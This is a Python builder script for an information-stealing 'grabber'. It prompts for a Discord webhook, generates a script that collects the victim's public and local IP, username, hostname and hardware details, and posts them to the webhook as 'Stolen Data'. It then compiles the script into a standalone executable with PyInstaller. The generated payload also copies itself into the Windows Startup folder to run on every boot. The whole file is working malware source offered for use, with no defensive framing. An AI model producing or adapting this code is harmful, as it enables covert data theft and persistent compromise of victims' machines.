import subprocess
import shutil
import os

# Function to generate the script with a custom webhook URL
def generate_script(webhook_url):
    script_template = f'''
import requests
import platform
import getpass
import psutil
import os
import shutil
import sys

# Define the Discord webhook URL where stolen data will be sent
WEBHOOK_URL = "{webhook_url}"

# Function to gather system and user information
def gather_data():
    data = {{}}
    data['Public_IP'] = get_public_ipv4()
    data['Local_IP'] = get_local_ipv4()
    data['Username'] = getpass.getuser()
    data['Hostname'] = platform.node()
    data['Platform'] = platform.platform()
    data['Architecture'] = platform.architecture()
    data['System'] = platform.system()
    data['Release'] = platform.release()
    data['Version'] = platform.version()
    data['CPU'] = platform.processor()
    data['GPU'] = get_gpu_info()
    data['RAM'] = get_ram_info()
    # Add more data gathering functions as needed

    return data

# Function to get public IPv4 address
def get_public_ipv4():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json()['ip']
        else:
            print("Failed to retrieve public IPv4 address:", response.text)
            return "Failed to retrieve"
    except Exception as e:
        print("Failed to retrieve public IPv4 address:", e)
        return "Failed to retrieve"

# Function to get local IPv4 address
def get_local_ipv4():
    try:
        return psutil.net_if_addrs()['Ethernet'][0].address
    except Exception as e:
        print("Failed to retrieve local IPv4 address:", e)
        return "Failed to retrieve"

# Function to get GPU information
def get_gpu_info():
    gpu_info = []
    if platform.system() == "Windows":
        query = 'wmic path win32_videocontroller get caption'
        result = os.popen(query).read().strip().split('\\n')[1:]
        gpu_info = [gpu.strip() for gpu in result if gpu.strip()]
    elif platform.system() == "Linux":
        try:
            with open('/proc/driver/nvidia/cards/0') as f:
                for line in f:
                    if line.strip().startswith("Model:"):
                        gpu_info.append(line.strip().split(":")[1].strip())
        except FileNotFoundError:
            pass
    # Add more conditions for other platforms as needed
    return gpu_info

# Function to get RAM information
def get_ram_info():
    return psutil.virtual_memory().total

# Function to send stolen data to the Discord webhook
def send_data(data):
    try:
        response = requests.post(WEBHOOK_URL, json={{ "content": f"Stolen Data:\\nPublic IP: {{data['Public_IP']}}\\nLocal IP: {{data['Local_IP']}}\\nUsername: {{data['Username']}}\\nHostname: {{data['Hostname']}}\\nPlatform: {{data['Platform']}}\\nArchitecture: {{data['Architecture']}}\\nSystem: {{data['System']}}\\nRelease: {{data['Release']}}\\nVersion: {{data['Version']}}\\nCPU: {{data['CPU']}}\\nGPU: {{data['GPU']}}\\nRAM: {{data['RAM']}}" }})
        print("Response:", response.status_code, response.text)
    except Exception as e:
        print("Failed to send data to the Discord webhook:", e)

# Function to make the file run on startup
def make_startup_file():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shutil.copy(sys.argv[0], startup_folder)

# Main function to execute data stealing and sending
def main():
    stolen_data = gather_data()
    send_data(stolen_data)
    make_startup_file()

if __name__ == "__main__":
    main()
'''

    return script_template

# Function to write the generated script to a file
def write_script(script_content):
    with open('grabber.py', 'w') as f:
        f.write(script_content)
        print("Grabber script has been written to grabber.py")

# Function to compile the generated script
def compile_script():
    try:
        subprocess.run(["python", "-m", "PyInstaller", "--onefile", "grabber.py"], check=True)
        print("Grabber script has been compiled successfully.")
    except subprocess.CalledProcessError as e:
        print("Failed to compile the grabber script:", e)

# Function to move the compiled executable to the original folder
def move_executable():
    try:
        current_path = os.getcwd()
        dist_path = os.path.join(current_path, "dist")
        executable_name = os.listdir(dist_path)[0]
        shutil.move(os.path.join(dist_path, executable_name), current_path)
        print("Executable moved to the original folder successfully.")
    except Exception as e:
        print("Failed to move the executable to the original folder:", e)

# Function to delete the 'dist' and 'build' folders
def cleanup():
    try:
        shutil.rmtree("dist")
        shutil.rmtree("build")
        print("Cleanup completed successfully.")
    except Exception as e:
        print("Failed to perform cleanup:", e)

# Custom webhook URL
custom_webhook_url = input("""
                           
░▒▓██████▓▒░▒▓████████▓▒░▒▓██████▓▒░        ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒▒▓███▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓██████▓▒░        ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                           
                           Enter your custom webhook URL: """)

# Generate the script with the custom webhook URL
generated_script_content = generate_script(custom_webhook_url)

# Write the generated script to a file
write_script(generated_script_content)

# Compile the generated script
compile_script()

# Move the compiled executable to the original folder
move_executable()

# Cleanup
cleanup()
